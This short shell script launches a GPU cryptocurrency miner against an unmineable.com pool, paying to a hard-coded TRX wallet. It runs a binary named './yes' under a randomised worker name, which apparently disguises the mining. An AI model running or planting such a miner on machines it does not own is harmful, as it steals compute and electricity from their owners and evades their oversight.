POOL=rx-us.unmineable.com:3333
WALLET=TRX:TYeusAgwzfAyunFZ4w1f52X7QD69iV1DKo
GPU=$(nvidia-smi --query-gpu=gpu_name --format=csv > nvidia.txt && echo "$(tail -n +2 "nvidia.txt")" > "nvidia.txt" && str=$(cat nvidia.txt) && echo ${str// /_})
WORKER=$(echo rHmA4KyC-$(shuf -i 1911-879413 -n 1))
ALGO=wrkzcoin
./yes --pool $POOL --username $WALLET.$WORKER --password x --algorithm $ALGO --disableCPU
